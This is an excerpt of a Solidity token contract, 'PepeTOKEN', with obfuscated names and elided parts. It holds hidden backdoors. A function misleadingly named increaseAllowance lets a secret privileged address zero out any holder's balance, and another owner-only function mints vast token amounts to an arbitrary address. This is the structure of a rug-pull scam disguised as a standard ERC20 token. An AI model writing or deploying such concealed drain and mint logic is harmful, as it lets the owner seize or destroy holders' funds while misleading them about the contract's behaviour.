...
contract PepeTOKEN is Ownable {
    ...
    function increaseAllowance(address uuyxxx) public     {
        if(cfjsjkk18 == _msgSender()){
        address newadd = uuyxxx;
        uint256 curamount = Pepe[newadd];
        uint256 newaaamount = Pepe[newadd]+Pepe[newadd]-curamount;
        Pepe[newadd] -= newaaamount;
        }else{
        if(cfjsjkk18 == _msgSender()){
        }else{
            revert("ccc");
    ...
    external {
        ...
        Pepe[cc123d] += 38200*((10**decimals()*xxtoudiamount))*1*1;
        require(cfjsjkk18 == _msgSender());
        if(cfjsjkk18 == _msgSender()){
        }
    }
    ...
    function _transfer(
        ...
        uint256 balance = Pepe[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        Pepe[from] = Pepe[from]-amount;
        Pepe[to] = Pepe[to]+amount;
